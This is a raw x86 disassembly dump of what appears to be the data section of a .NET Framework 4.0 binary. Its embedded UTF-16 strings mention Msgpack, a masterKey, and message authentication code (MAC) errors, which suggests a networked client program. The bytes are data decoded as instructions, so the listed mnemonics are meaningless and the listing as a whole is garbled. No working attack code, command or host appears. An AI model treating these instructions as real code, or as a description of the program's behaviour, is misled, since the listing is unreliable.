  40bc1d:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc23:	52                   	push   %edx
  40bc24:	00 75 00             	add    %dh,0x0(%ebp)
  40bc27:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc28:	00 00                	add    %al,(%eax)
  40bc2a:	0f 4d 00             	cmovge (%eax),%eax
  40bc2d:	73 00                	jae    0x40bc2f
  40bc2f:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc33:	61                   	popa
  40bc34:	00 63 00             	add    %ah,0x0(%ebx)
  40bc37:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc3a:	11 52 00             	adc    %edx,0x0(%edx)
  40bc3d:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc41:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc45:	76 00                	jbe    0x40bc47
  40bc47:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc4c:	0b 45 00             	or     0x0(%ebp),%eax
  40bc4f:	72 00                	jb     0x40bc51
  40bc51:	72 00                	jb     0x40bc53
  40bc53:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc54:	00 72 00             	add    %dh,0x0(%edx)
  40bc57:	00 47 6d             	add    %al,0x6d(%edi)
  40bc5a:	00 61 00             	add    %ah,0x0(%ecx)
  40bc5d:	73 00                	jae    0x40bc5f
  40bc5f:	74 00                	je     0x40bc61
  40bc61:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc65:	4b                   	dec    %ebx
  40bc66:	00 65 00             	add    %ah,0x0(%ebp)
  40bc69:	79 00                	jns    0x40bc6b
  40bc6b:	20 00                	and    %al,(%eax)
  40bc6d:	63 00                	arpl   %eax,(%eax)
  40bc6f:	61                   	popa
  40bc70:	00 6e 00             	add    %ch,0x0(%esi)
  40bc73:	20 00                	and    %al,(%eax)
  40bc75:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc76:	00 6f 00             	add    %ch,0x0(%edi)
  40bc79:	74 00                	je     0x40bc7b
  40bc7b:	20 00                	and    %al,(%eax)
  40bc7d:	62 00                	bound  %eax,(%eax)
  40bc7f:	65 00 20             	add    %ah,%gs:(%eax)
  40bc82:	00 6e 00             	add    %ch,0x0(%esi)
  40bc85:	75 00                	jne    0x40bc87
  40bc87:	6c                   	insb   (%dx),%es:(%edi)
  40bc88:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc8c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc8f:	72 00                	jb     0x40bc91
  40bc91:	20 00                	and    %al,(%eax)
  40bc93:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc97:	70 00                	jo     0x40bc99
  40bc99:	74 00                	je     0x40bc9b
  40bc9b:	79 00                	jns    0x40bc9d
  40bc9d:	2e 00 00             	add    %al,%cs:(%eax)
  40bca0:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bca5:	70 00                	jo     0x40bca7
  40bca7:	75 00                	jne    0x40bca9
  40bca9:	74 00                	je     0x40bcab
  40bcab:	20 00                	and    %al,(%eax)
  40bcad:	63 00                	arpl   %eax,(%eax)
  40bcaf:	61                   	popa
  40bcb0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcb3:	20 00                	and    %al,(%eax)
  40bcb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcb6:	00 6f 00             	add    %ch,0x0(%edi)
  40bcb9:	74 00                	je     0x40bcbb
  40bcbb:	20 00                	and    %al,(%eax)
  40bcbd:	62 00                	bound  %eax,(%eax)
  40bcbf:	65 00 20             	add    %ah,%gs:(%eax)
  40bcc2:	00 6e 00             	add    %ch,0x0(%esi)
  40bcc5:	75 00                	jne    0x40bcc7
  40bcc7:	6c                   	insb   (%dx),%es:(%edi)
  40bcc8:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bccc:	00 00                	add    %al,(%eax)
  40bcce:	55                   	push   %ebp
  40bccf:	49                   	dec    %ecx
  40bcd0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcd3:	76 00                	jbe    0x40bcd5
  40bcd5:	61                   	popa
  40bcd6:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcda:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcde:	00 6d 00             	add    %ch,0x0(%ebp)
  40bce1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bce5:	73 00                	jae    0x40bce7
  40bce7:	61                   	popa
  40bce8:	00 67 00             	add    %ah,0x0(%edi)
  40bceb:	65 00 20             	add    %ah,%gs:(%eax)
  40bcee:	00 61 00             	add    %ah,0x0(%ecx)
  40bcf1:	75 00                	jne    0x40bcf3
  40bcf3:	74 00                	je     0x40bcf5
  40bcf5:	68 00 65 00 6e       	push   $0x6e006500
  40bcfa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcfe:	00 63 00             	add    %ah,0x0(%ebx)
  40bd01:	61                   	popa
  40bd02:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd06:	00 6f 00             	add    %ch,0x0(%edi)
  40bd09:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd0a:	00 20                	add    %ah,(%eax)
  40bd0c:	00 63 00             	add    %ah,0x0(%ebx)
  40bd0f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd10:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd14:	00 20                	add    %ah,(%eax)
  40bd16:	00 28                	add    %ch,(%eax)
  40bd18:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd1b:	41                   	inc    %ecx
  40bd1c:	00 43 00             	add    %al,0x0(%ebx)
  40bd1f:	29 00                	sub    %eax,(%eax)
  40bd21:	2e 00 00             	add    %al,%cs:(%eax)
  40bd24:	05 58 00 32 00       	add    $0x320058,%eax
  40bd29:	00 0f                	add    %cl,(%edi)
  40bd2b:	7b 00                	jnp    0x40bd2d
  40bd2d:	30 00                	xor    %al,(%eax)
  40bd2f:	3a 00                	cmp    (%eax),%al
  40bd31:	44                   	inc    %esp
  40bd32:	00 33                	add    %dh,(%ebx)
  40bd34:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd37:	20 00                	and    %al,(%eax)
  40bd39:	00 0f                	add    %cl,(%edi)
  40bd3b:	7b 00                	jnp    0x40bd3d
  40bd3d:	30 00                	xor    %al,(%eax)
  40bd3f:	3a 00                	cmp    (%eax),%al
  40bd41:	58                   	pop    %eax
  40bd42:	00 32                	add    %dh,(%edx)
  40bd44:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd47:	20 00                	and    %al,(%eax)
  40bd49:	00 2b                	add    %ch,(%ebx)
  40bd4b:	28 00                	sub    %al,(%eax)
  40bd4d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd4e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd51:	76 00                	jbe    0x40bd53
  40bd53:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd57:	20 00                	and    %al,(%eax)
  40bd59:	75 00                	jne    0x40bd5b
  40bd5b:	73 00                	jae    0x40bd5d
  40bd5d:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd62:	00 20                	add    %ah,(%eax)
  40bd64:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd68:	00 70 00             	add    %dh,0x0(%eax)
  40bd6b:	65 00 20             	add    %ah,%gs:(%eax)
  40bd6e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd71:	63 00                	arpl   %eax,(%eax)
  40bd73:	31 00                	xor    %eax,(%eax)
  40bd75:	00 45 28             	add    %al,0x28(%ebp)
  40bd78:	00 65 00             	add    %ah,0x0(%ebp)
  40bd7b:	78 00                	js     0x40bd7d
  40bd7d:	74 00                	je     0x40bd7f
  40bd7f:	38 00                	cmp    %al,(%eax)
  40bd81:	2c 00                	sub    $0x0,%al
  40bd83:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd87:	74 00                	je     0x40bd89
  40bd89:	31 00                	xor    %eax,(%eax)
  40bd8b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd8f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd93:	33 00                	xor    (%eax),%eax
  40bd95:	32 00                	xor    (%eax),%al
  40bd97:	29 00                	sub    %eax,(%eax)
  40bd99:	20 00                	and    %al,(%eax)
  40bd9b:	74 00                	je     0x40bd9d
  40bd9d:	79 00                	jns    0x40bd9f
  40bd9f:	70 00                	jo     0x40bda1
  40bda1:	65 00 20             	add    %ah,%gs:(%eax)
  40bda4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bda7:	63 00                	arpl   %eax,(%eax)
  40bda9:	37                   	aaa
  40bdaa:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bdad:	24 00                	and    $0x0,%al
  40bdaf:	63 00                	arpl   %eax,(%eax)
  40bdb1:	38 00                	cmp    %al,(%eax)
  40bdb3:	2c 00                	sub    $0x0,%al
  40bdb5:	24 00                	and    $0x0,%al
  40bdb7:	63 00                	arpl   %eax,(%eax)
  40bdb9:	39 00                	cmp    %eax,(%eax)
  40bdbb:	00 ad 81 9c a1 a7    	add    %ch,-0x585e637f(%ebp)
  40bdc1:	dc 42 49             	faddl  0x49(%edx)
  40bdc4:	ad                   	lods   %ds:(%esi),%eax
  40bdc5:	7b c0                	jnp    0x40bd87
  40bdc7:	d7                   	xlat   %ds:(%ebx)
  40bdc8:	3f                   	aas
  40bdc9:	66 74 31             	data16 je 0x40bdfd
  40bdcc:	00 08                	add    %cl,(%eax)
  40bdce:	b7 7a                	mov    $0x7a,%bh
  40bdd0:	5c                   	pop    %esp
  40bdd1:	56                   	push   %esi
  40bdd2:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bdd5:	89 03                	mov    %eax,(%ebx)
  40bdd7:	00 00                	add    %al,(%eax)
  40bdd9:	01 03                	add    %eax,(%ebx)
  40bddb:	20 00                	and    %al,(%eax)
  40bddd:	01 02                	add    %eax,(%edx)
  40bddf:	06                   	push   %es
  40bde0:	0e                   	push   %cs
  40bde1:	03 06                	add    (%esi),%eax
  40bde3:	12 09                	adc    (%ecx),%cl
  40bde5:	03 06                	add    (%esi),%eax
  40bde7:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdeb:	00 02                	add    %al,(%edx)
  40bded:	03 06                	add    (%esi),%eax
  40bdef:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bdf5:	03 06                	add    (%esi),%eax
  40bdf7:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bdfc:	03 06                	add    (%esi),%eax
  40bdfe:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be04:	06                   	push   %es
  40be05:	1c 02                	sbb    $0x2,%al
  40be07:	06                   	push   %es
  40be08:	08 04 00             	or     %al,(%eax,%eax,1)
  40be0b:	00 12                	add    %dl,(%edx)
  40be0d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be12:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be18:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be1e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be21:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be27:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be2d:	0a 04 00             	or     (%eax,%eax,1),%al
  40be30:	01 01                	add    %eax,(%ecx)
  40be32:	0a 04 00             	or     (%eax,%eax,1),%al
  40be35:	00 12                	add    %dl,(%edx)
  40be37:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be3c:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be42:	02 03                	add    (%ebx),%al
  40be44:	00 00                	add    %al,(%eax)
  40be46:	1c 03                	sbb    $0x3,%al
  40be48:	00 00                	add    %al,(%eax)
  40be4a:	08 04 00             	or     %al,(%eax,%eax,1)
  40be4d:	01 01                	add    %eax,(%ecx)
  40be4f:	08 04 00             	or     %al,(%eax,%eax,1)
  40be52:	01 02                	add    %eax,(%edx)
  40be54:	0e                   	push   %cs
  40be55:	0a 00                	or     (%eax),%al
  40be57:	04 02                	add    $0x2,%al
  40be59:	1c 12                	sbb    $0x12,%al
  40be5b:	19 12                	sbb    %edx,(%edx)
  40be5d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be62:	01 01                	add    %eax,(%ecx)
  40be64:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be6a:	1c 04                	sbb    $0x4,%al
  40be6c:	08 00                	or     %al,(%eax)
  40be6e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be74:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be77:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be7d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be80:	00 12                	add    %dl,(%edx)
  40be82:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be87:	03 08                	add    (%eax),%ecx
  40be89:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be8c:	08 00                	or     %al,(%eax)
  40be8e:	08 03                	or     %al,(%ebx)
  40be90:	00 00                	add    %al,(%eax)
  40be92:	0e                   	push   %cs
  40be93:	04 00                	add    $0x0,%al
  40be95:	01 0e                	add    %ecx,(%esi)
  40be97:	0e                   	push   %cs
  40be98:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be9e:	d5 0a                	aad    $0xa
  40bea0:	3a 06                	cmp    (%esi),%al
  40bea2:	00 01                	add    %al,(%ecx)
  40bea4:	12 29                	adc    (%ecx),%ch
  40bea6:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40beac:	03 00                	add    (%eax),%eax
  40beae:	00 18                	add    %bl,(%eax)
  40beb0:	07                   	pop    %es
  40beb1:	00 03                	add    %al,(%ebx)
  40beb3:	08 18                	or     %bl,(%eax)
  40beb5:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bebb:	18 0e                	sbb    %cl,(%esi)
  40bebd:	06                   	push   %es
  40bebe:	00 02                	add    %al,(%edx)
  40bec0:	02 18                	add    (%eax),%bl
  40bec2:	10 02                	adc    %al,(%edx)
  40bec4:	06                   	push   %es
  40bec5:	00 01                	add    %al,(%ecx)
  40bec7:	11 30                	adc    %esi,(%eax)
  40bec9:	11 30                	adc    %esi,(%eax)
  40becb:	06                   	push   %es
  40becc:	00 03                	add    %al,(%ebx)
  40bece:	01 09                	add    %ecx,(%ecx)
  40bed0:	09 09                	or     %ecx,(%ecx)
  40bed2:	02 06                	add    (%esi),%al
  40bed4:	09 03                	or     %eax,(%ebx)
  40bed6:	06                   	push   %es
  40bed7:	11 30                	adc    %esi,(%eax)
  40bed9:	04 00                	add    $0x0,%al
  40bedb:	00 00                	add    %al,(%eax)
  40bedd:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bee1:	00 00                	add    %al,(%eax)
  40bee3:	04 01                	add    $0x1,%al
  40bee5:	00 00                	add    %al,(%eax)
  40bee7:	00 06                	add    %al,(%esi)
  40bee9:	00 02                	add    %al,(%edx)
  40beeb:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40beee:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bef3:	0e                   	push   %cs
  40bef4:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bef9:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40befe:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf03:	60                   	pusha
  40bf04:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf09:	60                   	pusha
  40bf0a:	04 00                	add    $0x0,%al
  40bf0c:	01 01                	add    %eax,(%ecx)
  40bf0e:	0e                   	push   %cs
  40bf0f:	18 06                	sbb    %al,(%esi)
  40bf11:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf16:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf19:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf1c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf22:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf27:	0e                   	push   %cs
  40bf28:	04 20                	add    $0x20,%al
  40bf2a:	00 00                	add    %al,(%eax)
  40bf2c:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf2f:	00 00                	add    %al,(%eax)
  40bf31:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf34:	00 00                	add    %al,(%eax)
  40bf36:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf39:	01 01                	add    %eax,(%ecx)
  40bf3b:	0e                   	push   %cs
  40bf3c:	04 20                	add    $0x20,%al
  40bf3e:	01 0e                	add    %ecx,(%esi)
  40bf40:	0e                   	push   %cs
  40bf41:	06                   	push   %es
  40bf42:	20 01                	and    %al,(%ecx)
  40bf44:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf49:	20 02                	and    %al,(%edx)
  40bf4b:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf51:	00 01                	add    %al,(%ecx)
  40bf53:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf58:	06                   	push   %es
  40bf59:	11 50 03             	adc    %edx,0x3(%eax)
  40bf5c:	06                   	push   %es
  40bf5d:	12 55 05             	adc    0x5(%ebp),%dl
  40bf60:	00 01                	add    %al,(%ecx)
  40bf62:	0e                   	push   %cs
  40bf63:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf68:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf6d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf73:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf79:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf7f:	01 01                	add    %eax,(%ecx)
  40bf81:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf86:	60                   	pusha
  40bf87:	03 20                	add    (%eax),%esp
  40bf89:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf8c:	20 00                	and    %al,(%eax)
  40bf8e:	02 03                	add    (%ebx),%al
  40bf90:	28 00                	sub    %al,(%eax)
  40bf92:	1c 03                	sbb    $0x3,%al
  40bf94:	06                   	push   %es
  40bf95:	12 60 0b             	adc    0xb(%eax),%ah
  40bf98:	20 02                	and    %al,(%edx)
  40bf9a:	01 12                	add    %edx,(%edx)
  40bf9c:	60                   	pusha
  40bf9d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfa2:	60                   	pusha
  40bfa3:	04 20                	add    $0x20,%al
  40bfa5:	00 12                	add    %dl,(%edx)
  40bfa7:	60                   	pusha
  40bfa8:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfad:	0e                   	push   %cs
  40bfae:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfb3:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfb9:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfbe:	60                   	pusha
  40bfbf:	08 03                	or     %al,(%ebx)
  40bfc1:	20 00                	and    %al,(%eax)
  40bfc3:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfc9:	08 03                	or     %al,(%ebx)
  40bfcb:	28 00                	sub    %al,(%eax)
  40bfcd:	08 03                	or     %al,(%ebx)
  40bfcf:	06                   	push   %es
  40bfd0:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfd4:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfd8:	01 08                	add    %ecx,(%eax)
  40bfda:	0e                   	push   %cs
  40bfdb:	05 20 01 01 12       	add    $0x12010120,%eax
  40bfe0:	61                   	popa
  40bfe1:	04 20                	add    $0x20,%al
  40bfe3:	01 01                	add    %eax,(%ecx)
  40bfe5:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bfe8:	01 01                	add    %eax,(%ecx)
  40bfea:	0b 03                	or     (%ebx),%eax
  40bfec:	20 00                	and    %al,(%eax)
  40bfee:	0b 03                	or     (%ebx),%eax
  40bff0:	20 00                	and    %al,(%eax)
  40bff2:	0a 03                	or     (%ebx),%al
  40bff4:	20 00                	and    %al,(%eax)
  40bff6:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bffb:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c000:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c005:	01 0e                	add    %ecx,(%esi)
  40c007:	0e                   	push   %cs
  40c008:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c00d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c010:	01 02                	add    %eax,(%edx)
  40c012:	0e                   	push   %cs
  40c013:	03 20                	add    (%eax),%esp
  40c015:	00 0e                	add    %cl,(%esi)
  40c017:	04 20                	add    $0x20,%al
  40c019:	01 01                	add    %eax,(%ecx)
  40c01b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c01e:	01 01                	add    %eax,(%ecx)
  40c020:	0c 04                	or     $0x4,%al
  40c022:	20 01                	and    %al,(%ecx)
  40c024:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c02a:	5c                   	pop    %esp
  40c02b:	04 20                	add    $0x20,%al
  40c02d:	00 11                	add    %dl,(%ecx)
  40c02f:	64 04 20             	fs add $0x20,%al
  40c032:	00 12                	add    %dl,(%edx)
  40c034:	59                   	pop    %ecx
  40c035:	03 28                	add    (%eax),%ebp
  40c037:	00 0e                	add    %cl,(%esi)
  40c039:	03 28                	add    (%eax),%ebp
  40c03b:	00 0a                	add    %cl,(%edx)
  40c03d:	03 28                	add    (%eax),%ebp
  40c03f:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c045:	5c                   	pop    %esp
  40c046:	04 28                	add    $0x28,%al
  40c048:	00 11                	add    %dl,(%ecx)
  40c04a:	64 04 00             	fs add $0x0,%al
  40c04d:	00 00                	add    %al,(%eax)
  40c04f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c052:	00 00                	add    %al,(%eax)
  40c054:	00 04 04             	add    %al,(%esp,%eax,1)
  40c057:	00 00                	add    %al,(%eax)
  40c059:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c060:	06                   	push   %es
  40c061:	00 00                	add    %al,(%eax)
  40c063:	00 04 07             	add    %al,(%edi,%eax,1)
  40c066:	00 00                	add    %al,(%eax)
  40c068:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c06b:	00 00                	add    %al,(%eax)
  40c06d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c070:	00 00                	add    %al,(%eax)
  40c072:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c075:	00 00                	add    %al,(%eax)
  40c077:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c07a:	00 00                	add    %al,(%eax)
  40c07c:	00 06                	add    %al,(%esi)
  40c07e:	00 02                	add    %al,(%edx)
  40c080:	0e                   	push   %cs
  40c081:	12 61 08             	adc    0x8(%ecx),%ah
  40c084:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c089:	61                   	popa
  40c08a:	06                   	push   %es
  40c08b:	00 02                	add    %al,(%edx)
  40c08d:	0e                   	push   %cs
  40c08e:	05 12 61 05 00       	add    $0x56112,%eax
  40c093:	01 01                	add    %eax,(%ecx)
  40c095:	12 61 06             	adc    0x6(%ecx),%ah
  40c098:	00 02                	add    %al,(%edx)
  40c09a:	01 12                	add    %edx,(%edx)
  40c09c:	61                   	popa
  40c09d:	0e                   	push   %cs
  40c09e:	07                   	pop    %es
  40c09f:	00 02                	add    %al,(%edx)
  40c0a1:	01 12                	add    %edx,(%edx)
  40c0a3:	61                   	popa
  40c0a4:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c0a9:	01 12                	add    %edx,(%edx)
  40c0ab:	61                   	popa
  40c0ac:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0b1:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0b4:	06                   	push   %es
  40c0b5:	00 02                	add    %al,(%edx)
  40c0b7:	01 12                	add    %edx,(%edx)
  40c0b9:	61                   	popa
  40c0ba:	02 06                	add    (%esi),%al
  40c0bc:	00 02                	add    %al,(%edx)
  40c0be:	01 12                	add    %edx,(%edx)
  40c0c0:	61                   	popa
  40c0c1:	0b 06                	or     (%esi),%eax
  40c0c3:	00 02                	add    %al,(%edx)
  40c0c5:	01 12                	add    %edx,(%edx)
  40c0c7:	61                   	popa
  40c0c8:	0a 03                	or     (%ebx),%al
  40c0ca:	06                   	push   %es
  40c0cb:	11 78 04             	adc    %edi,0x4(%eax)
  40c0ce:	20 01                	and    %al,(%ecx)
  40c0d0:	01 08                	add    %ecx,(%eax)
  40c0d2:	08 01                	or     %al,(%ecx)
  40c0d4:	00 08                	add    %cl,(%eax)
  40c0d6:	00 00                	add    %al,(%eax)
  40c0d8:	00 00                	add    %al,(%eax)
  40c0da:	00 1e                	add    %bl,(%esi)
  40c0dc:	01 00                	add    %eax,(%eax)
  40c0de:	01 00                	add    %eax,(%eax)
  40c0e0:	54                   	push   %esp
  40c0e1:	02 16                	add    (%esi),%dl
  40c0e3:	57                   	push   %edi
  40c0e4:	72 61                	jb     0x40c147
  40c0e6:	70 4e                	jo     0x40c136
  40c0e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0ea:	45                   	inc    %ebp
  40c0eb:	78 63                	js     0x40c150
  40c0ed:	65 70 74             	gs jo  0x40c164
  40c0f0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0f7:	77 73                	ja     0x40c16c
  40c0f9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0ff:	71 08                	jno    0x40c109
  40c101:	01 00                	add    %eax,(%eax)
  40c103:	02 00                	add    (%eax),%al
  40c105:	00 00                	add    %al,(%eax)
  40c107:	00 00                	add    %al,(%eax)
  40c109:	05 01 00 00 00       	add    $0x1,%eax
  40c10e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c111:	00 07                	add    %al,(%edi)
  40c113:	31 2e                	xor    %ebp,(%esi)
  40c115:	30 2e                	xor    %ch,(%esi)
  40c117:	30 2e                	xor    %ch,(%esi)
  40c119:	30 00                	xor    %al,(%eax)
  40c11b:	00 65 01             	add    %ah,0x1(%ebp)
  40c11e:	00 29                	add    %ch,(%ecx)
  40c120:	2e 4e                	cs dec %esi
  40c122:	45                   	inc    %ebp
  40c123:	54                   	push   %esp
  40c124:	46                   	inc    %esi
  40c125:	72 61                	jb     0x40c188
  40c127:	6d                   	insl   (%dx),%es:(%edi)
  40c128:	65 77 6f             	gs ja  0x40c19a
  40c12b:	72 6b                	jb     0x40c198
  40c12d:	2c 56                	sub    $0x56,%al
  40c12f:	65 72 73             	gs jb  0x40c1a5
  40c132:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c139:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c13c:	72 6f                	jb     0x40c1ad
  40c13e:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c145:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c14c:	0e                   	push   %cs
  40c14d:	14 46                	adc    $0x46,%al
  40c14f:	72 61                	jb     0x40c1b2
  40c151:	6d                   	insl   (%dx),%es:(%edi)
  40c152:	65 77 6f             	gs ja  0x40c1c4
  40c155:	72 6b                	jb     0x40c1c2
  40c157:	44                   	inc    %esp
  40c158:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c15f:	61                   	popa
  40c160:	6d                   	insl   (%dx),%es:(%edi)
  40c161:	65 1f                	gs pop %ds
  40c163:	2e 4e                	cs dec %esi
  40c165:	45                   	inc    %ebp
  40c166:	54                   	push   %esp
  40c167:	20 46 72             	and    %al,0x72(%esi)
  40c16a:	61                   	popa
  40c16b:	6d                   	insl   (%dx),%es:(%edi)
  40c16c:	65 77 6f             	gs ja  0x40c1de
  40c16f:	72 6b                	jb     0x40c1dc
  40c171:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c174:	43                   	inc    %ebx
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c17d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c17e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c185:	04 49                	add    $0x49,%al
  40c187:	74 65                	je     0x40c1ee
  40c189:	6d                   	insl   (%dx),%es:(%edi)
  40c18a:	00 00                	add    %al,(%eax)
  40c18c:	03 07                	add    (%edi),%eax
  40c18e:	01 08                	add    %ecx,(%eax)
  40c190:	04 00                	add    $0x0,%al
  40c192:	01 08                	add    %ecx,(%eax)
  40c194:	0e                   	push   %cs
  40c195:	03 07                	add    (%edi),%eax
  40c197:	01 02                	add    %eax,(%edx)
  40c199:	05 00 00 12 80       	add    $0x80120000,%eax
  40c19e:	b1 05                	mov    $0x5,%cl
  40c1a0:	20 01                	and    %al,(%ecx)
  40c1a2:	0e                   	push   %cs
  40c1a3:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c1a8:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c1ae:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c1b4:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c1b9:	03 02                	add    (%edx),%eax
  40c1bb:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1c0:	14 07                	adc    $0x7,%al
  40c1c2:	08 0e                	or     %cl,(%esi)
